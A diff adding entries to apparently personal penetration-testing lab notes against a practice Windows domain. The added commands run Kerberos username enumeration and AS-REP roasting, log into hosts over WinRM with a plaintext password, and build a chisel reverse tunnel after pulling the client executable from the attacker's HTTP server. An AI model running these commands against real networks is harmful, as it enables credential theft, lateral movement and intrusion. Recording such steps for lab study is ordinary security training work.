@@ -44,6 +44,26 @@ C:\Users\aries>netstat -ano | findstr /R "^ *TCP"
 c:\>dir /s *.kbdx
 c:\>dir /s *.zip 
 
+cd C:\Program Files\ManageEngine\AppManager14\working\pgsql\bin
+""NotePad to open BackUpPSQL""
+
+┌──(kali㉿kali)-[~/lab0/97]
+└─$ ./kerbrute_linux_amd64 userenum --dc 192.168.218.97 -d secura.yzx -o kerbrute-user-enum xato-net-10-million-usernames.txt //enum
+./GetNPUsers.py -usersfile usernames.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.218.97 'secura.yzx/' //check ASREP
+
+
+
+└─$ crackmapexec winrm 192.168.103.95-97 -u apache -p 'New2Era4.!' --local-auth
+└─$ evil-winrm -i 192.168.103.96  -u apache -p 'New2Era4.!'        
+
+
+==Chisel.exe==
+┌──(kali㉿kali)-[~/lab0/96]
+└─$ ./chisel.exe server -p 8000 --reverse //linux version-> then upload windows version to http server
+
+
+*Evil-WinRM* PS C:\Users\apache.ERA\Documents> Invoke-WebRequest -Uri http://192.168.45.214:80/lab0/96/chisel_windows.exe -OutFile C:\Users\apache.ERA\Documents\chisel_windows.exe
+*Evil-WinRM* PS C:\Users\apache.ERA\Documents> .\chisel_windows.exe client 192.168.45.214:8000 R:3306:127.0.0.1:3306
 
 
 
